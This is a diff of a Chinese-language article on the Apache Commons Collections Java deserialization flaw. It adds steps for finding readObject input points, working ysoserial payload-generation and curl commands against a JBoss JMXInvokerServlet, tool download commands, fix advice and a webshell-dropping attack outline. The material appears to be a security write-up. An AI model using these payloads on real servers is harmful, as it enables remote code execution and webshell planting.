@@ -250,6 +250,74 @@ Gadget chain:
                                 Runtime.exec()
 ```
 
+# 漏洞挖掘
+
+**1.漏洞触发场景**
+
+   在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：
+
+　　1\)HTTP请求中的参数，cookies以及Parameters。
+
+　　2\)RMI协议，被广泛使用的RMI协议完全基于序列化
+
+　　4\)JMX 同样用于处理序列化对象
+
+　　5\)自定义协议用来接收与发送原始的java对象
+
+
+
+**2. 漏洞挖掘**
+
+　　\(1\)确定反序列化输入点
+
+　　　　首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：
+
+　　　　 1\)源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。
+
+　　         2\)对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等
+
+　　　      注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。
+
+　　\(2\)再考察应用的Class Path中是否包含Apache Commons Collections库
+
+　　\(3\)生成反序列化的payload
+
+　　\(4\)提交我们的payload数据
+
+# 漏洞测试
+
+
+
+```
+搜索匹配"readObject"靶点
+　　 grep -nr "readObject" *
+测试是否含该漏洞的jar包文件
+    grep -R InvokerTransformer
+生成序列化payload数据
+    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 '想要执行的命令' > payload.out
+提交payload数据
+　　curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '@payload.out' http://ip:8080/invoker/JMXInvokerServlet
+
+```
+
+```
+exploit例子
+java -jar  ysoserial-0.0.2-all.jar   CommonsCollections1  'echo 1 > /tmp/pwned'  >  payload
+curl --header 'Content-Type: application/x-java-serialized-object; class="org".jboss.invocation.MarshalledValue' --data-binary '@/tmp/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
+```
+
+```
+工具获取方法
+
+去github上下载jar发行版：https://github.com/frohoff/ysoserial/releases
+wget https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar
+
+或者自行编译：
+git　clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package -DskipTests
+```
+
 # **影响及修复**
 
 受影响的通用库和框架
@@ -279,7 +347,6 @@ public final class test extends ObjectInputStream{
     }
       ...
 }
-
 ```
 
 **2.禁止JVM执行外部命令Runtime.exec**
@@ -323,43 +390,36 @@ SecurityManager originalSecurityManager = System.getSecurityManager();
 
 Java反序列化大多存在复杂系统间相互调用，控制，或较为底层的服务应用间交互等应用场景上，因此接口本身可能就存在一定的安全隐患。Java反序列化本身没有错，而是面对不安全的数据时，缺乏相应的防范，导致了一些安全问题。并且不容忽视的是，也许某些Java服务没有直接使用存在漏洞的Java库，但只要Lib中存在存在漏洞的Java库，依然可能会受到威胁。
 
+**  
+3、更新更新Apache Commons Collections库**
 
-
-**3、更新更新Apache Commons Collections库**
-
-        Apache Commons Collections在3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。
-
-
+```
+    Apache Commons Collections在3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。
+```
 
 # 总结
 
 漏洞分析
 
-　　引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
+引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。
 
-　　
+
 
 原因: 类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行。
 
-　　　　　CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法
+CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法
 
-　　根源：Apache Commons Collections允许链式的任意的类函数反射调用
+根源：Apache Commons Collections允许链式的任意的类函数反射调用
 
-　　　　　问题函数：org.apache.commons.collections.Transformer接口
+问题函数：org.apache.commons.collections.Transformer接口
 
-　　利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。
+利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。
 
-　　思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。
+思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。
 
-　  至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，
+至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，
 
 将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。
-
-
-
-
-
-
 
 参考资料：
 
